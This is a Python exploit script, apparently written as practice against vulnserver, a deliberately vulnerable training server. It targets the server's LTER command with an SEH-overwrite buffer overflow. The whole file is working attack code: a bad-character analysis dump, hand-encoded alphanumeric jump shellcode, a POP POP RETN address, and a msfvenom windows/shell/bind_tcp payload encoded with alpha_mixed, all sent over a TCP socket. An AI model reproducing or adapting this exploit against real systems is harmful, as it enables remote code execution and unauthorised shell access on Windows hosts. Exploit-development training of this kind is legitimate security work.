#!/usr/bin/python

import socket
import sys

host = "192.168.160.101"
port = 9999

#########################################
## WriTTen by: van6uard
## vulnserver LTER Exploit
## POP POP RETN at 6250172B

#[+] Comparing with memory at location : 0x0138f218 (Stack)
#Only 127 original bytes of 'normal' code found.
#    ,-----------------------------------------------.
#    | Comparison results:                           |
#    |-----------------------------------------------|
#  0 |01 02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 0f 10| File
#    |                                               | Memory
# 10 |11 12 13 14 15 16 17 18 19 1a 1b 1c 1d 1e 1f 20| File
#    |                                               | Memory
# 20 |21 22 23 24 25 26 27 28 29 2a 2b 2c 2d 2e 2f 30| File
#    |                                               | Memory
# 30 |31 32 33 34 35 36 37 38 39 3a 3b 3c 3d 3e 3f 40| File
#    |                                               | Memory
# 40 |41 42 43 44 45 46 47 48 49 4a 4b 4c 4d 4e 4f 50| File
#    |                                               | Memory
# 50 |51 52 53 54 55 56 57 58 59 5a 5b 5c 5d 5e 5f 60| File
#    |                                               | Memory
# 60 |61 62 63 64 65 66 67 68 69 6a 6b 6c 6d 6e 6f 70| File
#    |                                               | Memory
# 70 |71 72 73 74 75 76 77 78 79 7a 7b 7c 7d 7e 7f 80| File
#    |                                             01| Memory
# 80 |81 82 83 84 85 86 87 88 89 8a 8b 8c 8d 8e 8f 90| File
#    |02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 0f 10 11| Memory
# 90 |91 92 93 94 95 96 97 98 99 9a 9b 9c 9d 9e 9f a0| File
#    |12 13 14 15 16 17 18 19 1a 1b 1c 1d 1e 1f 20 21| Memory
# a0 |a1 a2 a3 a4 a5 a6 a7 a8 a9 aa ab ac ad ae af b0| File
#    |22 23 24 25 26 27 28 29 2a 2b 2c 2d 2e 2f 30 31| Memory
# b0 |b1 b2 b3 b4 b5 b6 b7 b8 b9 ba bb bc bd be bf c0| File
#    |32 33 34 35 36 37 38 39 3a 3b 3c 3d 3e 3f 40 41| Memory
# c0 |c1 c2 c3 c4 c5 c6 c7 c8 c9 ca cb cc cd ce cf d0| File
#    |42 43 44 45 46 47 48 49 4a 4b 4c 4d 4e 4f 50 51| Memory
# d0 |d1 d2 d3 d4 d5 d6 d7 d8 d9 da db dc dd de df e0| File
#    |52 53 54 55 56 57 58 59 5a 5b 5c 5d 5e 5f 60 61| Memory
# e0 |e1 e2 e3 e4 e5 e6 e7 e8 e9 ea eb ec ed ee ef f0| File
#    |62 63 64 65 66 67 68 69 6a 6b 6c 6d 6e 6f 70 71| Memory
# f0 |f1 f2 f3 f4 f5 f6 f7 f8 f9 fa fb fc fd fe ff   | File
#    |72 73 74 75 76 77 78 79 7a 7b 7c 7d 7e 7f 80   | Memory
#     `-----------------------------------------------'

#                | File      | Memory    | Note       
# -----------------------------------------------------
# 0   0   127 127 | 01 ... 7f | 01 ... 7f | unmodified!
# -----------------------------------------------------
# 127 127 128 128 | 80 ... ff | 01 ... 80 | corrupted  
# 
# Possibly bad chars: 80
# Bytes omitted from input: 00

# The value in esp is close to our shellcode.  We push it to eax, and calculate the difference to the shellcode
# address and then split it in 3 to keep the values such 14c that is a good character, since 3e4 is not. 
# Then push that value back into ESP.
jump = ""
jump += "\x55\x58"               # push ebp, pop eax
jump += "\x66\x05\x7a\x08"       # add ax, 87a
jump += "\x66\x05\x7a\x08"       # add ax, 87a
jump += "\x50\x5c"               # push eax, pop esp
jump += "\x25\x4A\x4D\x4E\x55"   ## and  eax, 0x554e4d4a
jump += "\x25\x35\x32\x31\x2A"   ## and  eax, 0x2a313235
jump += "\x05\x76\x40\x50\x50"   ## add  eax, 0x50504076
jump += "\x05\x75\x40\x40\x40"   ## add  eax, 0x40404075
jump += "\x50"                   # boom eb 80

#align esp
longjump = ""
longjump += "\x55\x58"          # push ebp, pop eax
longjump += "\x66\x05\x09\x03"  # add ax, 309 to bring esp where we want it
longjump += "\x50\x59"          # push eax, pop ecx stick shellcode where it will sit
longjump += "\x54\x58"          # push esp, pop eax
longjump += "\x2c\x40"          # sub al, 40
longjump += "\x50\x5c"          # push eax, pop esp

# encoded call eax instruction
longjump += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
longjump += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
longjump += "\x05\x77\x61\x41\x41" ## add  eax, 0x41416177
longjump += "\x05\x66\x62\x41\x41" ## add  eax, 0x41416266
longjump += "\x05\x55\x41\x41\x41" ## add  eax, 0x41414155
longjump += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
longjump += "\x50"                 ## push eax

# msfvenom -a x86 --platform windows -p windows/shell/bind_tcp -e x86/alpha_mixed BufferRegister=ECX -f python -v payload
# Found 1 compatible encoders
# Attempting to encode payload with 1 iterations of x86/alpha_mixed
# x86/alpha_mixed succeeded with size 671 (iteration=0)
# x86/alpha_mixed chosen with final size 671
# Payload size: 671 bytes
# Final size of python file: 3482 bytes
payload =  ""
payload += "\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
payload += "\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50"
payload += "\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32"
payload += "\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42"
payload += "\x75\x4a\x49\x79\x6c\x4b\x58\x6e\x62\x63\x30\x67"
payload += "\x70\x33\x30\x43\x50\x6f\x79\x48\x65\x30\x31\x39"
payload += "\x50\x30\x64\x6e\x6b\x70\x50\x34\x70\x6c\x4b\x31"
payload += "\x42\x56\x6c\x6e\x6b\x46\x32\x64\x54\x6c\x4b\x54"
payload += "\x32\x47\x58\x46\x6f\x6d\x67\x63\x7a\x45\x76\x34"
payload += "\x71\x49\x6f\x6c\x6c\x75\x6c\x43\x51\x51\x6c\x55"
payload += "\x52\x54\x6c\x77\x50\x39\x51\x4a\x6f\x36\x6d\x47"
payload += "\x71\x4a\x67\x38\x62\x68\x72\x50\x52\x50\x57\x6e"
payload += "\x6b\x42\x72\x56\x70\x4e\x6b\x52\x6a\x57\x4c\x6e"
payload += "\x6b\x52\x6c\x77\x61\x72\x58\x38\x63\x32\x68\x77"
payload += "\x71\x5a\x71\x62\x71\x4c\x4b\x52\x79\x45\x70\x75"
payload += "\x51\x6b\x63\x6c\x4b\x52\x69\x32\x38\x4b\x53\x75"
payload += "\x6a\x50\x49\x4c\x4b\x66\x54\x6e\x6b\x45\x51\x78"
payload += "\x56\x44\x71\x49\x6f\x6e\x4c\x7a\x61\x5a\x6f\x54"
payload += "\x4d\x77\x71\x38\x47\x76\x58\x6d\x30\x52\x55\x7a"
payload += "\x56\x35\x53\x43\x4d\x58\x78\x67\x4b\x33\x4d\x46"
payload += "\x44\x44\x35\x4b\x54\x43\x68\x4e\x6b\x31\x48\x67"
payload += "\x54\x43\x31\x6b\x63\x53\x56\x4e\x6b\x64\x4c\x72"
payload += "\x6b\x6c\x4b\x42\x78\x45\x4c\x53\x31\x79\x43\x6e"
payload += "\x6b\x63\x34\x4e\x6b\x77\x71\x4a\x70\x4d\x59\x30"
payload += "\x44\x74\x64\x76\x44\x33\x6b\x33\x6b\x51\x71\x52"
payload += "\x79\x70\x5a\x53\x61\x69\x6f\x6b\x50\x63\x6f\x73"
payload += "\x6f\x52\x7a\x4e\x6b\x55\x42\x58\x6b\x6c\x4d\x31"
payload += "\x4d\x33\x58\x35\x63\x65\x62\x65\x50\x35\x50\x30"
payload += "\x68\x33\x47\x44\x33\x70\x32\x33\x6f\x36\x34\x50"
payload += "\x68\x32\x6c\x72\x57\x44\x66\x75\x57\x6b\x4f\x5a"
payload += "\x75\x6d\x68\x5a\x30\x45\x51\x55\x50\x75\x50\x61"
payload += "\x39\x5a\x64\x61\x44\x56\x30\x72\x48\x77\x59\x6f"
payload += "\x70\x52\x4b\x35\x50\x59\x6f\x58\x55\x63\x5a\x74"
payload += "\x4b\x62\x79\x70\x50\x6b\x52\x39\x6d\x33\x5a\x65"
payload += "\x51\x70\x6a\x34\x42\x51\x78\x58\x6a\x56\x6f\x69"
payload += "\x4f\x6b\x50\x6b\x4f\x6a\x75\x4d\x47\x33\x58\x47"
payload += "\x72\x75\x50\x72\x31\x53\x6c\x6d\x59\x59\x76\x62"
payload += "\x4a\x66\x70\x70\x56\x56\x37\x33\x58\x4b\x72\x79"
payload += "\x4b\x74\x77\x75\x37\x59\x6f\x5a\x75\x6f\x75\x39"
payload += "\x50\x62\x55\x76\x38\x61\x47\x55\x38\x4e\x57\x49"
payload += "\x79\x57\x48\x79\x6f\x69\x6f\x49\x45\x42\x77\x32"
payload += "\x48\x30\x74\x78\x6c\x75\x6b\x59\x71\x59\x6f\x4a"
payload += "\x75\x30\x57\x4e\x77\x73\x58\x71\x65\x50\x6e\x42"
payload += "\x6d\x35\x31\x4b\x4f\x6b\x65\x33\x5a\x47\x70\x52"
payload += "\x4a\x77\x74\x53\x66\x52\x77\x31\x78\x64\x42\x49"
payload += "\x49\x6f\x38\x53\x6f\x59\x6f\x79\x45\x6c\x43\x68"
payload += "\x78\x57\x70\x31\x6e\x56\x4d\x6c\x4b\x35\x66\x30"
payload += "\x6a\x61\x50\x61\x78\x35\x50\x64\x50\x63\x30\x37"
payload += "\x70\x46\x36\x50\x6a\x67\x70\x70\x68\x72\x78\x79"
payload += "\x34\x72\x73\x78\x65\x39\x6f\x4a\x75\x6e\x73\x31"
payload += "\x43\x71\x7a\x63\x30\x46\x36\x33\x63\x42\x77\x55"
payload += "\x38\x77\x72\x4b\x69\x59\x58\x63\x6f\x69\x6f\x4a"
payload += "\x75\x6b\x33\x4c\x38\x55\x50\x71\x6e\x63\x37\x37"
payload += "\x71\x6b\x73\x45\x79\x49\x56\x31\x65\x79\x79\x4b"
payload += "\x73\x4d\x6b\x6a\x50\x6c\x75\x6f\x52\x30\x56\x63"
payload += "\x5a\x65\x50\x53\x63\x69\x6f\x6e\x35\x41\x41"



buf = 'LTER /.:/' 
buf += payload
buf += 'A'*(3515-82-len(payload))
buf += longjump
buf += 'B'*(82-len(longjump))
buf += "\x77\x06\x76\x06"   #NSEH conditional jump forward
#buf += '\x4c\x4c\x77\xff'   #NSEH Conditional Jump
buf += '\x2b\x17\x50\x62'   #SEH
buf += 'D'*3
buf += jump             # calculated jump shellcode
buf += 'E'*(5000-3515-4-4-4-len(jump))
buf += '\x00\x00'

try:
    c = socket.socket(socket.AF_INET,socket.SOCK_STREAM) #tcp socket
    c.connect((host, port))
    c.send(buf + '\r\n')
    print "[+] Evil buffer sent"
    c.close()

except:
    print "[-] Can't send evil buffer"
    sys.exit()
